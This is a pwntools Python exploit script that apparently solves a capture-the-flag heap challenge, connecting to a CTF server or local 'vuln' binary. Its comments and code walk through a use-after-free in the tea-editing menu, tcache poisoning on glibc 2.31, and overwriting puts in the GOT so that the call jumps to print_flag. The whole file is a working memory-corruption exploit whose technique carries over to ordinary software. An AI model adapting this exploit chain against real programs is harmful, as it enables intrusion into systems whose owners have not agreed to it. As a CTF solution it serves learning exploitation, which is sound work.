#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln")
context.binary = exe

if args.REMOTE:
    r = remote("chals.disorientation.cssa.club", 9824)
else:
    r = process(exe.path)
    if args.GDB:
        gdb.attach(r)

# No PIE → fixed addresses
PUTS_GOT   = 0x403938  
PRINT_FLAG = 0x401654  

def spill(content):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'chars)\n', content)

def remove(idx):
    r.sendlineafter(b'> ', b'5')
    r.sendlineafter(b'Tea index: ', str(idx).encode())

def update(idx, content):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'Tea index: ', str(idx).encode())
    r.sendlineafter(b'Ok spill the new tea plz:\n', content)

# remove_tea() leaves dangling pointer.
# update_tea() ignores active flag → UAF write.
# UAF -> t cache poisoning -> GOT overwrite
#
# tea_t (24B)  → tcache[32]
# content (48B) → tcache[64]
#
# glibc 2.31: free() sets fd/key at data[0:16]; tea* at +16 survives.
# 1–2. Allocate tea0(A,B) and tea1(C,D)
# 3–4. Free D,C then B,A → both bins count=2; spilled_tea = A (dangling)
# 5. UAF update: write PUTS_GOT into B->fd (poison tcache[64])
# 6. malloc ->,B; next tcache[64] = PUTS_GOT
# 7. malloc ->,PUTS_GOT; overwrite puts@GOT with PRINT_FLAG
#    Next puts() call → print_flag() → flag




# 1–2. Allocate tea0(A,B) and tea1(C,D)
spill(b"tea zero")
spill(b"tea one")

# 3–4. Free D,C then B,A → both bins count=2; spilled_tea = A (dangling)
remove(1)                   # free D,C
remove(0)                   # free B,A (UAF on A)

# 5. UAF update: write PUTS_GOT into B->fd (poison tcache[64])
update(0, p64(PUTS_GOT))    # poison B->fd

# 6. malloc ->,B; next tcache[64] = PUTS_GOT
spill(b"consume")           # pop A,B

# 7. malloc ->,PUTS_GOT; overwrite puts@GOT with PRINT_FLAG
spill(p64(PRINT_FLAG))      

r.interactive()
